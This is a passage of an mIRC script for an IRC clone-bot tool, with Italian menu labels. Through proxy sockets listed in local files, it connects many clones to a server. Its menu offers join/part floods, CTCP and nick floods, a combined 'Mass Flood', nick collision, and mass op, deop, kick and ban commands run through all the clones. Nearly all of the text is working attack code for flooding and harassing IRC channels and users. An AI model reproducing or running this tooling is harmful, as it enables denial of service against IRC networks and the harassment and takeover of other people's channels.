n237=alias fwdel {
n238=  .set %fwdel.search $read -w* $+ $$1 $+ * $mircdirsocks\sock.txt | .set %fwdel.deline $readn | write -dl $+ $readn $mircdirsocks\sock.txt
n239=  if ($window(@socks-searcher)) { clear -l @socks-searcher | loadbuf @socks-searcher $mircdirsocks\sock.txt }
n240=}
n241=
n242=menu @fwclones {
n243=  Connetti ( $+ $lines($mircdir\socks\socks.txt) lines):{
n244=    window -l @socks-searcher 100 100 400 300 /fwclick $mircdir\socks\settings2.txt arial 12
n245=    loadbuf @socks-searcher $mircdir\socks\socks.txt
n246=    titlebar @socks-searcher Right click for Menu.
n247=  }
n248=  -
n249=  Start Clones:{ go $$?="Firewall (1080):" $$?="Clones n.:" $$?="Server IRC :" }
n250=  Ident
n251=  .Random (default):{ set %fw.identd 3 | echo Random ident. }
n252=  .Set ident:{ set %fw.identd 1 | .set %fw.identd.x $$?="Ident:" | echo Clones Ident: %fw.identd.x $+ . }
n253=  -
n254=  Set Nick:{ fw.setnick $$?="Nick clones:" }
n255=  Nick List:{ fw.nicklist }
n256=  -
n257=  Join :{ set %xchanfl $$?="Channel:" | skwinchk | .sockwrite -n fw* JOIN %xchanfl | .aline -p @fwclones [Clones joining %xchanfl $+ ] }
n258=  Part :{ set %xchanfl $$?="Channel:" | skwinchk | .sockwrite -n fw* PART %xchanfl : $+ %logo | .aline -p @fwclones [Clones parting %xchanfl $+ ] }
n259=  Commands
n260=  .op:{ skwinchk | .sockwrite -n fw* MODE $$?="Channel:" +ooo $$?="Nick(s)?" | .aline -p @fwclones [Clones opping $! $+ ] }
n261=  .deop:{ skwinchk | .sockwrite -n fw* MODE $$?="Channel:" -ooo $$?="Nick(s)?" | .aline -p @fwclones [Clones deopping $! $+ ] }
n262=  .kick:{ skwinchk | .sockwrite -n fw* KICK $$?="Channel:" $$?="Nick(s)?" :DarKBoGuS | .aline -p @fwclones Clones kicking $! $+ ] }
n263=  .ban:{ skwinchk | .sockwrite -n fw* MODE $$?="Channel:" +bbb $$?="Mask(s)?" | .aline -p @fwclones [Clones banning $! $+ ] }
n264=  .-
n265=  .Speak on channel:{ set %xchanfl $$?="Channel:" | skwinchk | .sockwrite -n fw* PRIVMSG %xchanfl : $+ $?="Clones says:" | .aline -p @fwclones [Clones speaking on %xchanfl ] }
n266=  .-
n267=  .Raw Command:{ skwinchk | .sockwrite -n fw* $$?="RAW command:" | .aline -p @fwclones [Clones sending Raw command $! $+ ] }
n268=  -
n269=  floods
n270=  .join/part:{ set %xchanfl $$?="Channel:" | skwinchk | /sockwrite -n fw* JOIN %xchanfl | sockwrite -n fw* PART %xchanfl : $+ %logo | .aline -p @fwclones [Clones Parting/Joining to %xchanfl $+ ] }
n271=  .join/part Mass:{ set %xchanfl $$?="Channel:" | jp %xchanfl }
n272=  .join/part n?:{ set %xchanfl $$?="Channel:" | set %temp.jpchan %xchanfl
n273=    set %temp.jpht $$?="Join/Part Mass n.:"
n274=    :nextjp
n275=    inc %temp.jpt
n276=    jp %temp.jpchan
n277=    if (%temp.jpt <= %temp.jpht) { goto nextjp }
n278=  }
n279=  .-
n280=  .Ctcp Flood:{ fwctcp $$?="Nick/Channel:" }
n281=  .Nick Flood:{ fw.nickflood | .timer 1 6 /fw.nickflood | .timer 1 12 /fw.nickflood | .timer 1 18 /fw.nickflood }
n282=  .-
n283=  .Mass Flood:{ set %xchanfl $$?="Channel:" | sockwrite -n fw* JOIN %xchanfl | .timer 1 6 /fw.nickflood | .timer 1 12 /fw.nickflood | .timer 1 18 /fw.nickflood | .timer 1 25 /fwctcp %xchanfl }
n284=  Reset Nick:{ clonereset }
n285=  -
n286=  collide
n287=  .Nick(s):/setc $$?="List of nick to collide (es.: nick1 nick2 nick3)"
n288=  .Channel:/set %xchanfl $$?="Channel:" | clps %xchanfl
n289=  -
n290=  Close
n291=  .All clones:{ cleanup }
n292=  .-
n293=  .Firewall Connection:{ skwinchk | /sockclose firewall | .aline -p @fwclones [Firewall connection closed] | .timer90 off | .timer92 off }
n294=  .-
n295=  .All Sockets:{ sockclose fw* | .aline -p @fwclones [All sockets closed] | .timer90 off | .timer92 off }
n296=  .-
n297=  Close Window:{ window -c @fwclones }
